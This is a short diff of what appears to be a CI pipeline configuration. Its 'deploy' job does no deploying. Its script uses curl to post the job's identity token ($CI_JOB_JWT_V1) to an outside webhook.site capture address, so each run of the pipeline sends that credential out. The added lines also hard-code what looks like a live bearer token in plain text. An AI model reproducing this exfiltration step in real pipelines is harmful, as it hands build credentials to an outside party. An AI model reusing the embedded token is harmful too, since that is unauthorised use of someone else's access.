@@ -5,3 +5,5 @@ default:
 
 deploy:
   script: 'curl -H \"Content-Type: application/json\" -X POST --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826'
+  var:
+    token: "Bearer AAAAAAAAAAAAAAAAAAAAAMLheAAAAAAA0%2BuSeid%2BULvsea4JtiGRiSDSJSI%3DEUifiRBkKG5E2XzMDjRfl76ZC9Ub0wnz4XsNiRVBChTYbJcE3F"
